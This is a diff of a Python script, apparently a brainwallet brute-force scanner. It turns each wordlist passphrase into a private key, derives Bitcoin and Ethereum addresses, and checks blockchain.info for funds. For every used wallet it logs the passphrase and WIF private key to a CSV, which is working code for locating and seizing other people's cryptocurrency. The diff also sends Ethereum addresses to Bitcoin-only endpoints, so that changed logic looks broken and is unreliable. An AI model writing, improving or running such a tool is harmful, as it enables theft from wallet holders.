@@ -1,30 +1,18 @@
 #!/usr/bin/env python3
-"""
-brute2_fixed_sleep.py (fixed)
-Sequential brute scanner for BTC (legacy P2PKH, nested segwit P2SH, native segwit Bech32)
-PLUS Ethereum checks by default. Enforces EXACT sleep (args.sleep) after every single API call.
-
-Fix: removed stray space that caused SyntaxError in the ETH URL f-string.
-"""
 from __future__ import annotations
 import argparse, io, sys, time, logging, hashlib, binascii
 import requests, base58
 from coincurve import PrivateKey
-
-# optional imports
 try:
     from Crypto.Hash import keccak
 except Exception:
     keccak = None
-
-# try to import bech32 functions from common bech32 package
 try:
     from bech32 import bech32_encode, convertbits
     _HAS_BECH32 = True
 except Exception:
     _HAS_BECH32 = False
 
-# ---------------- crypto helpers ----------------
 def sha256(b: bytes) -> bytes:
     return hashlib.sha256(b).digest()
 
@@ -45,29 +33,24 @@ def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
     chk = sha256(sha256(payload))[:4]
     return base58.b58encode(payload + chk).decode()
 
-# ---------------- BTC address derivations ----------------
 def btc_p2pkh(pub_bytes: bytes) -> str:
-    """Legacy 1..."""
     return base58check(b'\x00', hash160(pub_bytes))
 
 def btc_p2sh_p2wpkh(pub_bytes: bytes) -> str:
-    """Nested segwit 3... (P2SH of P2WPKH redeemscript)"""
-    redeem_script = b'\x00\x14' + hash160(pub_bytes)  # OP_0 + push20(pubhash)
+    redeem_script = b'\x00\x14' + hash160(pub_bytes)
     return base58check(b'\x05', hash160(redeem_script))
 
 def btc_bech32(pub_bytes: bytes) -> str:
-    """Native segwit bc1q... using bech32.convertbits + bech32_encode"""
     if not _HAS_BECH32:
         raise RuntimeError("bech32 library not available (pip install bech32)")
-    witprog = hash160(pub_bytes)            # 20 bytes
-    data = convertbits(witprog, 8, 5, True) # -> 5-bit groups
+    witprog = hash160(pub_bytes)
+    data = convertbits(witprog, 8, 5, True)
     if data is None:
         raise RuntimeError("bech32.convertbits failed")
-    data5 = [0] + data                       # witness version 0
+    data5 = [0] + data
     addr = bech32_encode("bc", data5)
     return addr
 
-# ---------------- Ethereum helpers ----------------
 def _keccak_256(data: bytes) -> bytes:
     if keccak is None:
         raise RuntimeError("pycryptodome required for keccak (pip install pycryptodome)")
@@ -89,36 +72,27 @@ def to_checksum_address(addr_hex_lower: str) -> str:
     return ''.join(out)
 
 def eth_address_from_privhex(priv_hex: str) -> str:
-    """Return 0x + EIP-55 checksummed address"""
     priv_bytes = bytes.fromhex(priv_hex)
     pk = PrivateKey(priv_bytes)
-    pub_uncompressed = pk.public_key.format(compressed=False)  # 65 bytes, 0x04 prefix
+    pub_uncompressed = pk.public_key.format(compressed=False)
     pub_no_prefix = pub_uncompressed[1:]
     digest = _keccak_256(pub_no_prefix)
     addr_bytes = digest[-20:]
     addr_hex = addr_bytes.hex()
     return "0x" + to_checksum_address(addr_hex)
 
-# ---------------- numeric fetcher ----------------
 def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
-    """
-    Return numeric value parsed from response; returns 0.0 if nothing parseable.
-    This function does NOT sleep — caller must sleep after each call.
-    """
     try:
         r = session.get(url, timeout=timeout)
         r.raise_for_status()
     except Exception as e:
         logging.debug("HTTP error for %s: %s", url, e)
         return 0.0
-
     text = r.text.strip()
-    # try direct float
     try:
         return float(text)
     except Exception:
         pass
-    # try common JSON numeric fields
     try:
         j = r.json()
         for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received","result"):
@@ -134,7 +108,6 @@ def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0)
         pass
     return 0.0
 
-# ---------------- helpers to print/write ----------------
 def print_used_btc(word, label, addr, wif, recv_val, bal_val, fout):
     print("\n=== USED BTC WALLET FOUND ===")
     print(f"WORD: {word}")
@@ -144,12 +117,10 @@ def print_used_btc(word, label, addr, wif, recv_val, bal_val, fout):
     print(f"TOTAL_RECEIVED: {recv_val}")
     print(f"BALANCE: {bal_val}")
     print("============================\n")
-    # CSV: word,protocol,type,address,wif,total_received,balance
     fout.write(f"{word},BTC,{label},{addr},{wif},{recv_val},{bal_val}\n")
     fout.flush()
 
 def print_used_eth(word, eth_addr, raw_wei, fout):
-    # convert wei to ETH for readability (may be huge floats; keep decimal)
     try:
         eth_amount = float(raw_wei) / 1e18
     except Exception:
@@ -160,11 +131,9 @@ def print_used_eth(word, eth_addr, raw_wei, fout):
     print(f"BALANCE RAW (wei): {raw_wei}")
     print(f"BALANCE (ETH): {eth_amount}")
     print("===========================\n")
-    # CSV: word,protocol,,address,,wei,eth
     fout.write(f"{word},ETH,,{eth_addr},,{raw_wei},{eth_amount}\n")
     fout.flush()
 
-# ---------------- main loop ----------------
 def main():
     ap = argparse.ArgumentParser(description="Brute sequential scanner: BTC (1,3,bc1q) + ETH (default on).")
     ap.add_argument("--dict", "-d", default="dictionary.txt", help="wordlist (one passphrase per line)")
@@ -175,12 +144,10 @@ def main():
     ap.set_defaults(eth=True)
     ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
     ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
-    ap.add_argument("--base-eth-balance", default="https://api.blockcypher.com/v1/eth/main/addrs")
     args = ap.parse_args()
 
     logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 
-    # dependency checks
     try:
         _ = PrivateKey(b'\x01' * 32)
     except Exception as e:
@@ -192,7 +159,6 @@ def main():
     if not _HAS_BECH32:
         logging.warning("bech32 library not found; bc1q address generation will be skipped. Install: pip install bech32")
 
-    # open files
     try:
         fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
     except Exception as e:
@@ -213,12 +179,10 @@ def main():
         for raw in fdict:
             try:
                 word = raw.strip()
-                current_word = word  # track the word being processed for immediate Ctrl+C reporting
+                current_word = word
                 if not word:
                     continue
                 total += 1
-
-                # derive private key / pubkey / wif
                 try:
                     priv_hex = privhex_from_passphrase(word)
                     pk = PrivateKey(bytes.fromhex(priv_hex))
@@ -228,7 +192,6 @@ def main():
                     logging.debug("Derivation failed for '%s': %s", word, e)
                     continue
 
-                # prepare BTC address list
                 btc_addresses = [
                     ("P2PKH", btc_p2pkh(pub_compressed)),
                     ("P2SH-P2WPKH", btc_p2sh_p2wpkh(pub_compressed))
@@ -239,59 +202,46 @@ def main():
                     except Exception as e:
                         logging.debug("Bech32 derivation error: %s", e)
 
-                # check each BTC address (ENFORCE: sleep AFTER every API call)
                 for label, addr in btc_addresses:
                     checked += 1
-
-                    # 1) getreceivedbyaddress
                     url_recv = f"{args.base_received}/{addr}"
                     recv_val = _get_raw_numeric(session, url_recv, timeout=20.0)
-                    # ALWAYS sleep after the received call
                     time.sleep(args.sleep)
-
-                    # 2) addressbalance
-                    url_bal = f"{args.base_balance}/{addr}"
-                    bal_val = _get_raw_numeric(session, url_bal, timeout=20.0)
-                    # ALWAYS sleep after the balance call
-                    time.sleep(args.sleep)
-
-                    # If either endpoint shows >0, report both values
-                    if recv_val > 0 or bal_val > 0:
+                    if recv_val > 0:
+                        url_bal = f"{args.base_balance}/{addr}"
+                        bal_val = _get_raw_numeric(session, url_bal, timeout=20.0)
+                        time.sleep(args.sleep)
                         logging.info("Found used BTC address %s %s (recv=%s bal=%s)", label, addr, recv_val, bal_val)
                         print_used_btc(word, label, addr, wif, recv_val, bal_val, fout)
                         found += 1
 
-                # ETH check (if enabled). Also enforce sleep AFTER the ETH call.
                 if args.eth:
                     try:
                         eth_addr = eth_address_from_privhex(priv_hex)
-                        # FIXED: correct argument name with no stray space
-                        url_eth = f"{args.base_eth_balance}/{eth_addr}/balance"
-                        eth_val = _get_raw_numeric(session, url_eth, timeout=20.0)
-                        # ALWAYS sleep after ETH call
+                        url_eth_recv = f"{args.base_received}/{eth_addr}"
+                        eth_recv = _get_raw_numeric(session, url_eth_recv, timeout=20.0)
                         time.sleep(args.sleep)
-                        if eth_val > 0:
-                            logging.info("Found used ETH address %s (wei=%s)", eth_addr, eth_val)
+                        if eth_recv > 0:
+                            url_eth_bal = f"{args.base_balance}/{eth_addr}"
+                            eth_val = _get_raw_numeric(session, url_eth_bal, timeout=20.0)
+                            time.sleep(args.sleep)
+                            logging.info("Found used ETH address %s (recv=%s wei=%s)", eth_addr, eth_recv, eth_val)
                             print_used_eth(word, eth_addr, eth_val, fout)
                             found += 1
                     except Exception as e:
                         logging.debug("ETH check error for word '%s': %s", word, e)
-                        # still enforce the sleep even on exception to keep timing constant
                         time.sleep(args.sleep)
 
-                # periodic logging
                 if total % 1000 == 0:
                     elapsed = time.time() - start_time
                     logging.info("Processed %d words — checked:%d found:%d — avg %.2f words/s", total, checked, found, total / max(1.0, elapsed))
 
             except KeyboardInterrupt:
-                # Immediate reporting and re-raise to outer handler
                 print("\n*** INTERRUPTED by user (inner) ***")
                 print(f"Stopping while processing word: {current_word!r}")
                 raise
 
     except KeyboardInterrupt:
-        # Immediate report on Ctrl+C (outer)
         print("\n*** INTERRUPTED by user (outer) ***")
         if current_word:
             print(f"Stopped while processing word: {current_word!r}")
